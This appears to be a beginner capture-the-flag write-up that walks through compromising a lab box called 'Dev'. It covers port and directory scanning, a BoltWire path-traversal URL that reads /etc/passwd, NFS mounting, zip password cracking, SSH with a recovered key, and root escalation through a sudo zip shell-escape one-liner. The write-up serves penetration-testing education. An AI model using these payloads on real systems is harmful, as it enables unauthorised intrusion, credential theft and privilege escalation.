![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/logo.png)

# Dev

This is the final box i've done.

*This is a linux machine*

lets's do an `Nmap` scan.
## Scanning
```
nmap -p- -T4 -A [ip]
```
#### Results :

```
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      42069/tcp6  mountd
|   100005  1,2,3      44319/udp6  mountd
|   100005  1,2,3      56307/tcp   mountd
|   100005  1,2,3      58676/udp   mountd
|   100021  1,3,4      33107/tcp6  nlockmgr
|   100021  1,3,4      40257/udp   nlockmgr
|   100021  1,3,4      46155/tcp   nlockmgr
|   100021  1,3,4      48538/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
35611/tcp open  mountd   1-3 (RPC #100005)
38353/tcp open  mountd   1-3 (RPC #100005)
46155/tcp open  nlockmgr 1-4 (RPC #100021)
56307/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
We will focus on these :
- OpenSSH 7.9p1 - 22
- Apache httpd 2.4.38 - 80(Bolt - Installation error)
- rpcbind - 111
- nfs - 2049 [Network File Share]
- Apache httpd 2.4.38 - 8080

If we go in to the `http` page we will see a Boltwire(CMS) Installation Error page 

```
http://192.168.xx.xx
```

And if you check the `https` page you'll see a `default php page`

Nothing much in here so we will do `directory busting`

## Directory Busting
 
 We will use `ffuf` tool to find Directorie 
 ```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://192.1xx.xx.x/FUZZ

```
#### Results:
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.57.8/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 46ms]
# on atleast 3 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 49ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 147ms]
public                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1230ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1324ms]
# Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1619ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1625ms]
# directory-list-2.3-small.txt [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1634ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1822ms]
src                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 21ms]
app                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 9ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2334ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2335ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2532ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2548ms]
vendor                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
extensions              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 21ms]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 3841ms]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 235ms]
:: Progress: [87664/87664] :: Job [1/1] :: 796 req/sec :: Duration: [0:02:08] :: Errors: 0 ::

```
- public
- src
- app
- vendor
- extensions

If we check the `/app/config` index.

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/configlo.png)

We will find `config.yml` which gives us information of `user` and a `password`

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/catconfig.png)

**SAVE THAT TO SOMEWHERE !**

let's do another scan on `8080`

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://192.xxx.xx.x:8080/FUZZ

```
#### Results:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.57.8:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-small.txt [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 44ms]
#                       [Status: 200, Size: 94603, Words: 4689, Lines: 1160, Duration: 17ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 154ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 169ms]
# on atleast 3 different hosts [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 102ms]
#                       [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 187ms]
                        [Status: 200, Size: 94603, Words: 4689, Lines: 1160, Duration: 124ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 159ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 1399ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 1359ms]
dev                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 42ms]
# Copyright 2007 James Fisher [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 1942ms]
#                       [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 1974ms]
#                       [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 1927ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 94604, Words: 4689, Lines: 1160, Duration: 1983ms]
                        [Status: 200, Size: 94609, Words: 4689, Lines: 1160, Duration: 66ms]
:: Progress: [87664/87664] :: Job [1/1] :: 722 req/sec :: Duration: [0:02:01] :: Errors: 0 ::

```

And we found

 - dev

Let's check it out

```
http://192.168.xx.xxx:8080/dev

```
We find a `Registeration page `

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/boltwire%20log.png)

## Local File Inclusion
Now let's search exploits for `Bolt CMS`
using `searchsploit`

```
searchsploit bolt
```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/exploitsCMSBolt.png)

Now there is `Local File Inclusion` it  Allows us to expose file that are running on a server.

We know they are running PHP so.
If you modify the `url` like this you might get info about the `/etc/passwd` file.
```
index.php?p=action.search&action=../../../../../../etc/passwd
```
It's like going back in a linux system many times.

Now to make this work we need to **Create an Account** on the `Boltwire`

After Creating Account we can modify the url to this

```
http://[target ip]:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd

```

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/dir.png)

And we can see the content on the `passwd` file

we found the `users` on the machine.

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/username.png)

### Enumerating NFS

Now remember in the scan we found `nfs (Network file system)`

So we will try to **list** the Directories that are shared with **nfs** using this command :

```
showmount -e [target]
------------------------------------------
showmount: This is the command used to query the mountd daemon on the NFS server to see what is being shared.

-e: This option stands for "exported." It tells showmount to show the list of exported file systems (the directories being shared).

[target]: This is the IP address or hostname of the remote server you're querying. It tells showmount which server to check for NFS shares.

```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/show.png)

let's create a folder on the `/mnt` folder called `dev` and mount the shared directories to our system
```
mkdir /mnt/dev
```
Mount the files :

```
mount -t nfs [target ip]:/srv/nfs /mnt/dev
--------------------------------------------
mount: This is the command used to attach file systems to your system’s directory tree.

-t nfs: This option specifies the type of file system you are mounting. Here, nfs indicates that you are mounting a Network File System.

[target ip]:/srv/nfs:

[target ip]: This is the IP address or hostname of the NFS server that is sharing the directory.
:/srv/nfs: This is the path to the directory on the NFS server that you want to mount. In this example, the directory /srv/nfs is being shared by the server.
/mnt/dev: This is the local directory (mount point) where you want to attach the shared directory. Once mounted, you can access the contents of /srv/nfs on the server as if they were located in /mnt/dev on your local machine.

```
Now if we check the `/mnt/dev/` folder we'll see the shared file over there

```
cd /mnt/dev

$ ls

save.zip
```
We have a zip file let's unzip it using the `unzip` tool

```
unzip save.zip

```
Now it's asking for a password which we don't know.

`Can we crack the Zip file ?`

 `Well Yes, Yes you can!`

### Zip Password Cracking
so let's try to crack the password by bruteforcing  using a wordlists using `frackzip` tool.

You can install this tool by :

```
apt install fcrackzip
```
Now let's crack :

```
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
----------------------------------------------
-v: This option stands for "verbose." It tells fcrackzip to provide detailed output, showing what the tool is doing as it attempts to crack the password.

-u: This option tells fcrackzip to test the integrity of the file after extracting it. This is useful to verify that the extracted file is not corrupted and the password is correct.

-D: This option enables dictionary mode, meaning that fcrackzip will use a wordlist to try to find the password by testing each word in the list.

-p /usr/share/wordlists/rockyou.txt: Specify the Wordlist location

save.zip : is the file that we want to crack


```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/zip%20cracking.png)

We have extracted :

- `todo.txt`
- `id_rsa`

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/todo.png)

We see `jp` probably user `jeanpaul` that we found in the `/etc/passwd`

We have an `id_rsa` key which we can use to `ssh` 
  
```
The id_rsa file is a private key used in SSH (Secure Shell) for secure communication between a client and a server. It is part of a key pair used for SSH authentication.
```
## Enumerating SSH

So we got our username as `jeanpaul`, the host  `Target Ip` and `id_rsa` key we can establish an ssh connection using the private key.

```
ssh -i id_rsa jeanpaul@[target ip]
--------------------------------------------
-i id_rsa:

-i: This option specifies the identity file (the private key) to use for the SSH connection.
id_rsa: This is the filename of the private key you want to use. The id_rsa file should contain your private key, which corresponds to a public key that has been added to the remote server's ~/.ssh/authorized_keys file.

jeanpaul@[target ip]:

jeanpaul: This is the username you want to log in as on the remote server.
[target ip]: This is the IP address (or hostname) of the remote server you want to connect to.
```

You'll be asked to enter a `passphrase` for key `'id_rsa'`

Now remember the `config.yml` file we found a password in that file `i_love_java`

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/loginwithssh.png)

And we are in !

Now we can check what are the commands/operations this user can do as **root** and without the need of a password. 

```
sudo -l
```
```
User jeanpaul may run the following commands on dev:
        (root) NOPASSWD: /usr/bin/zip
```

Abuse the `zip` feature to be able for us to escalate into root.
You can search for this in `GTFOBins` and i found [**this**](https://gtfobins.github.io/gtfobins/zip/)

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
Execute these one by one,and you'll get a shell !


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/ziponeliner.png)

#### Flag

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/4efe2df55044a81c237825e6ffcbb3761da1f006/Dev/images/root%20flag.png)

Had a lot of fun !
learned lot of new things..

Yep this is the end of the `Capstone challenges` !


